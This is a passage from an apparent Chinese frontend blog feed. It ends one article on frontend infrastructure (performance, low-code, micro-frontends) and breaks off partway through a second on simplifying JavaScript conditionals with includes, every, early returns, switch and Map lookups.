src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105264-c330d510-e0bb-4882-8e2c-17dab219e8cc.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105264-c330d510-e0bb-4882-8e2c-17dab219e8cc.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>前端工程可视化平台的目的：</strong></p><ul><li>方便项目管理；</li><li>高效提升工作效率；</li><li>一键搞定 CI&#x2F;CD 流；</li></ul><p><strong>前端工程可视化平台有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157106022-5dcbd2ae-bdeb-4334-ae93-72e2be9d51fc.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157106022-5dcbd2ae-bdeb-4334-ae93-72e2be9d51fc.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="yQgmu"></a></p><h2 id="14-前端性能优化"><a href="#14-前端性能优化" class="headerlink" title="14. 前端性能优化"></a>14. 前端性能优化</h2><p>性能优化这个词，我相信只要是程序员，多多少少都听过，而且都经历过；<br />如果你的项目是 ToB 项目，可能性能优化不会做到极致；<br />但是你的项目是 ToC 项目呢，那性能优化是不是就是一个你必须要考量的点呢？<br /><strong>场景重现：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105522-3c778742-f481-4770-84a8-f1b5e7d5ef4b.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105522-3c778742-f481-4770-84a8-f1b5e7d5ef4b.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />好家伙，用户直接崩溃，这是什么破网站，这么 🌶 🐔 ；<br /><strong>前端性能优化的意义：</strong></p><ul><li>页面加载的更快；</li><li>更好的用户体验；</li><li>降低服务器负荷；</li><li>提升编码的能力；</li></ul><p><strong>前端性能优化都有什么？</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105542-6d141ec1-7eaf-4ab8-8de3-52a6c6ee9ba9.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105542-6d141ec1-7eaf-4ab8-8de3-52a6c6ee9ba9.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="MUaAD"></a></p><h2 id="15-前端低代码平台搭建（建设中）"><a href="#15-前端低代码平台搭建（建设中）" class="headerlink" title="15. 前端低代码平台搭建（建设中）"></a>15. 前端低代码平台搭建（建设中）</h2><p>维基百科定义：低代码开发平台（LCDP） 本身也是一种软件，它为开发者提供了一个创建应用软件的开发环境；与传统编写代码的 IDE 不同，低代码开发平台提供更易用的可视化 IDE。<br />简单来讲，低代码（Low Code）就是一种可视化搭建系统，从字面意思来讲，一是可视化；二是少写代码。<br />无代码（No Code） 同样从字面上来理解，一是可视化，二是不写代码。<br /><strong>场景一：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105642-c5437ded-0deb-4a53-a281-4bbf3a0fa599.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105642-c5437ded-0deb-4a53-a281-4bbf3a0fa599.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>前端低代码平台的意义：</strong></p><ul><li><strong>降低开发成本；</strong></li><li><strong>所见即所得；</strong></li><li><strong>一站式研发；</strong></li><li><strong>技术收敛；</strong></li><li><strong>专业门槛低；</strong></li><li><strong>对新人友好，上手快；</strong></li></ul><p>注意：<br />低代码平台一般较针对于一些业务使用率较大且多是 ToB 的平台，所以判断当前系统是否需要使用低代码平台，建议在有大量业务的支撑前提下，否则得不偿失；<br />用新技术，更多的不是因为先进，而是适合。<br><a name="A5dpY"></a></p><h2 id="16-微前端（Micro-App）"><a href="#16-微前端（Micro-App）" class="headerlink" title="16. 微前端（Micro App）"></a>16. 微前端（Micro App）</h2><p>微前端（Micro-Frontends） 并没有定义框架或 API，它其实是一个类似 微服务架构 的概念；将 微服务 的概念扩展到了前端世界；<br />说微服务可能有些前端同学会感觉陌生，以咱们前端的角度一句话概括就是： 将您的大型前端应用拆分为多个小型前端应用，这样每个小型前端应用都有自己的仓库，可以专注于单一的某个功能；<br />需要强调的是，尽管我们将前端应用拆分为多个项目，但它们最终还是会被集成到一个单页前端应用程序中；因此，通过使用微前端架构，您不会在用户体验上有任何损失，只会有过之而无不及；<br /><strong>场景一：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105710-811e06bd-d9a4-46d2-8b21-60123228e6e4.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105710-811e06bd-d9a4-46d2-8b21-60123228e6e4.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br /><strong>为什么要用微前端：</strong></p><ul><li>技术上的灵活选择；</li><li>更快的且独立的部署；</li><li>团队代码的相互隔离；</li><li>并行开发和团队的自治；</li><li>项目的增量升级；</li></ul><p><strong>微前端的价值：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105978-9c61f61b-26cb-474e-a3fd-7187874549e7.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105978-9c61f61b-26cb-474e-a3fd-7187874549e7.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><strong>》</strong><br><a name="CHHyo"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于前端基建，在每个公司基建部分都会有所差异，有纯自动化一条龙的，有半自动化的等等；<br />但是如果我们细心的会发现，在几乎所有大中厂中，基建部分都不会少了 前端规范、前端文档、前端脚手架、前端组件库、前端工具库，所以如果实在是公司资源与业务限制，这几个还是值得去一探究竟的。<br />其实很多公司基建都不是一触而蹴的，基本上都是在常年累月的业务当中去 发现问题，定位问题，最后解决问题，然后在这个过程当中自然而然的沉淀出前端各个面向的基础设施，团队成员也会在这个过程当中找到适合自己的前端领域，并且深耕下去。<br />该系列会是一个持续更新系列，关于 前端基建，笔者主要会从如下图几个方面讲解，如果您想第一时间看到我的更新文章，可以<a href="https://juejin.cn/user/2305054774145918/columns">关注我</a>和我的《<a href="https://juejin.cn/column/7139087916306792462">前端要搞基建</a>》专栏<br /><img src="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105961-c45c173c-41ce-4af5-a4d6-9494fb10a98c.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2023/webp/300943/1675157105961-c45c173c-41ce-4af5-a4d6-9494fb10a98c.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="wOatq"></a></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> compatible </tag>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>条件语句的优化</title>
      <link href="/2022/10/19/frontend/js/skill/tiao-jian-yu-ju-de-you-hua/"/>
      <url>/2022/10/19/frontend/js/skill/tiao-jian-yu-ju-de-you-hua/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>在日常的开发中，我们经常会编写一些条件语句，过多的 if…else会导致代码难以理解和维护，今天来分享几个优化条件语句的小技巧！</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656768200664-7732e949-019b-42ac-b730-8d256e68053d.png?x-oss-process=image/resize,w_720,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1656768200664-7732e949-019b-42ac-b730-8d256e68053d.png?x-oss-process=image/resize,w_720,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="nvHwa"></a></p><h2 id="1-Array-includes"><a href="#1-Array-includes" class="headerlink" title="1. Array.includes"></a><br />1. Array.includes</h2><p>来看下面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">animal</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (animal == <span class="string">&#x27;lion&#x27;</span> || animal == <span class="string">&#x27;dog&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> animal;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;dog&#x27;</span>);</span><br></pre></td></tr></table></figure><p><br />在test方法中包含一个 if 语句，用来判断传入的参数animal是不是lion或者dog。这么写从语法上是没问题的，但是如果 if 的判断条件中不只有两个动物，而是有四只动物。如果继续使用 || 与运算符来写的话，代码就会很难维护并且看起来非常不优雅：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (animal == <span class="string">&#x27;lion&#x27;</span> || animal == <span class="string">&#x27;dog&#x27;</span> || animal == <span class="string">&#x27;cow&#x27;</span> || animal == <span class="string">&#x27;cat&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> animal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于这种需要对同一个变量进行多次判断的条件语句，可以使用数组的<code>includes()</code>方法来优化，该方法可以用于确定数组中是否存在指定元素，如果存在指定的元素，就会返回 <code>true</code>，如果不存在就会返回 <code>false</code>。使用 <code>includes() </code>来修改写上面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([<span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;cow&#x27;</span>, <span class="string">&#x27;lion&#x27;</span>].<span class="title function_">includes</span>(animal)) &#123;</span><br><span class="line">    <span class="keyword">return</span> animal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这样代码看起来就简洁了很多，并且如果想继续增加其他的动物，只需在数组中继续增加元素即可。</p><p><a name="jodGR"></a></p><h2 id="2-Array-every"><a href="#2-Array-every" class="headerlink" title="2. Array.every"></a>2. Array.every</h2><p>来看下面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car1&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car2&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;blue&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car3&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;purple&#x27;</span> &#125;</span><br><span class="line">];</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">cars</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> isAllblue = <span class="literal">true</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">of</span> cars) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isAllblue) <span class="keyword">break</span>;</span><br><span class="line">        isAllblue = (c.<span class="property">color</span> == <span class="string">&#x27;blue&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> isAllblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(cars);</span><br></pre></td></tr></table></figure><p><br />JavaScript 中的数组提供了<code>every()</code>方法，该方法用于检查数组中所有元素是否满足给定条件。当每个数组元素都满足给定条件时会返回 <code>true</code>，否则会返回<code>false</code>。可以使用该方法来优化上面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car1&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car2&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;blue&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;car3&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;purple&#x27;</span> &#125;</span><br><span class="line">];</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">cars</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> cars.<span class="title function_">every</span>(<span class="function"><span class="params">c</span> =&gt;</span> c.<span class="property">color</span> == <span class="string">&#x27;blue&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(cars);</span><br></pre></td></tr></table></figure><p><a name="bHb3k"></a></p><h2 id="3-尽早-return"><a href="#3-尽早-return" class="headerlink" title="3. 尽早 return"></a>3. 尽早 return</h2><p>在 JavaScript 中，尽早 <code>return</code>是一种将函数体减少<code>else</code>语句的简单方法。来看下面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">fruit, quantity</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> redFruits = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;cranberries&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fruit) &#123;</span><br><span class="line">    <span class="keyword">if</span> (redFruits.<span class="title function_">includes</span>(fruit)) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (quantity &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;big quantity&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No fruit!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="literal">null</span>); <span class="comment">// error: No fruits</span></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;apple&#x27;</span>); <span class="comment">// red</span></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;apple&#x27;</span>, <span class="number">20</span>); <span class="comment">// red, big quantity</span></span><br></pre></td></tr></table></figure><p>来使用这种模式来优化上面的代码，可以在无效条件时尽早返回：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">fruit, quantity</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> redFruits = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;cranberries&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fruit) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No fruit!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (redFruits.<span class="title function_">includes</span>(fruit)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (quantity &gt; <span class="number">10</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;big quantity&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以进一步优化，如果 redFruits 中不包含fruit，就提前返回：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">fruit, quantity</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> redFruits = [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;strawberry&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;cranberries&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fruit) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;No fruit!&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!redFruits.<span class="title function_">includes</span>(fruit)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;red&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (quantity &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;big quantity&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />可以看到，使用这种模式可以消除不必要的<code>else</code>语句，使得函数更加清晰和简洁。</p><p><a name="qChhR"></a></p><h2 id="4-三元运算符"><a href="#4-三元运算符" class="headerlink" title="4. 三元运算符"></a>4. 三元运算符</h2><p>对于上面例子中的函数，可以使用 JavaScript 的三元运算符来重构：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">IsRed</span>(<span class="params">someObject</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> someObject !== <span class="string">&#x27;object&#x27;</span> || someObject.<span class="property">color</span> !== <span class="string">&#x27;Red&#x27;</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于上面的三元表达式，还可以进行简化：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">IsRed</span>(<span class="params">someObject</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> !(<span class="keyword">typeof</span> someObject !== <span class="string">&#x27;object&#x27;</span> || someObject.<span class="property">color</span> !== <span class="string">&#x27;Red&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于这种<code>if...else</code>块中都分别只有一个表达式的情况，就可以使用三元表达式来简化<code>if...else</code>语句。</p><p><a name="k49Zr"></a></p><h2 id="5-switch…case"><a href="#5-switch…case" class="headerlink" title="5. switch…case"></a>5. switch…case</h2><p>来看下面的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printCars</span>(<span class="params">color</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (color === <span class="string">&#x27;red&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Rcar1&#x27;</span>, <span class="string">&#x27;Rcar2&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (color === <span class="string">&#x27;blue&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Bcar1&#x27;</span>, <span class="string">&#x27;Bcar2&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (color === <span class="string">&#x27;purple&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Pcar1&#x27;</span>, <span class="string">&#x27;Pcar2&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于这种if的判断条件中都是针对一个变量进行判断的情况，可以使用<code>switch...case</code>来简化：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printCars</span>(<span class="params">color</span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (color) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;red&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Rcar1&#x27;</span>, <span class="string">&#x27;Rcar2&#x27;</span>];</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;blue&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Bcar1&#x27;</span>, <span class="string">&#x27;Bcar2&#x27;</span>];</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;purple&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> [<span class="string">&#x27;Pcar1&#x27;</span>, <span class="string">&#x27;Pcar2&#x27;</span>];</span><br><span class="line">    <span class="attr">default</span>:</span><br><span class="line">      <span class="keyword">return</span> [];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="BYUiF"></a></p><h2 id="6-Map-x2F-Object"><a href="#6-Map-x2F-Object" class="headerlink" title="6. Map&#x2F;Object"></a>6. Map&#x2F;Object</h2><p>对于上面的代码，可以使用对象来继续优化：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> carColor = &#123;</span><br><span class="line">    <span class="attr">red</span>: [<span class="string">&#x27;Rcar1&#x27;</span>, <span class="string">&#x27;Rcar2&#x27;</span>],</span><br><span class="line">    <span class="attr">blue</span>: [<span class="string">&#x27;Bcar1&#x27;</span>, <span class="string">&#x27;Bcar2&#x27;</span>],</span><br><span class="line">    <span class="attr">purple</span>: [<span class="string">&#x27;Pcar1&#x27;</span>, <span class="string">&#x27;Pcar2&#x27;</span>]</span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printcars</span>(<span class="params">color</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> carColor[color] || [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>());       <span class="comment">// []</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>(<span class="string">&#x27;red&#x27;</span>));  <span class="comment">// [&#x27;Rcar1&#x27;，&#x27;Rcar2&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>(<span class="string">&#x27;blue&#x27;</span>)); <span class="comment">// [&#x27;Bcar1&#x27;，&#x27;Bcar2&#x27;]</span></span><br></pre></td></tr></table></figure><p><br />也可以使用 Map 来实现相同的结果：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> carColor = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line">    .<span class="title function_">set</span>(<span class="string">&#x27;red&#x27;</span>, [<span class="string">&#x27;Rcar1&#x27;</span>, <span class="string">&#x27;Rcar2&#x27;</span>])</span><br><span class="line">    .<span class="title function_">set</span>(<span class="string">&#x27;blue&#x27;</span>, [<span class="string">&#x27;Bcar1&#x27;</span>, <span class="string">&#x27;Bcar2&#x27;</span>])</span><br><span class="line">    .<span class="title function_">set</span>(<span class="string">&#x27;purple&#x27;</span>, [<span class="string">&#x27;Pcar1&#x27;</span>, <span class="string">&#x27;Pcar2&#x27;</span>]);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printcars</span>(<span class="params">color</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> carColor.<span class="title function_">get</span>(color) || [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>());       <span class="comment">// []</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>(<span class="string">&#x27;red&#x27;</span>));  <span class="comment">// [&#x27;Rcar1&#x27;，&#x27;Rcar2&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">printcars</span>(<span class="string">&#x27;blue&#x27;</span>)); <span class="comment">// [&#x27;Bcar1&#x27;，&#x27;Bcar2&#x27;]</span></span><br></pre></td></tr></table></figure><p><a name="NtN8P"></a></p><h2 id="7-默认函数参数和解构"><a href="#7-默认函数参数和解构" class="headerlink" title="7. 默认函数参数和解构"></a>7. 默认函数参数和解构</h2><p>来看下面的代码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">flower, quantity</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!flower) <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> num = quantity || <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;num&#125;</span>朵<span class="subst">$&#123;flower&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="title function_">check</span>(<span class="string">&#x27;玫瑰&#x27;</span>);    <span class="comment">// 1朵玫瑰</span></span><br><span 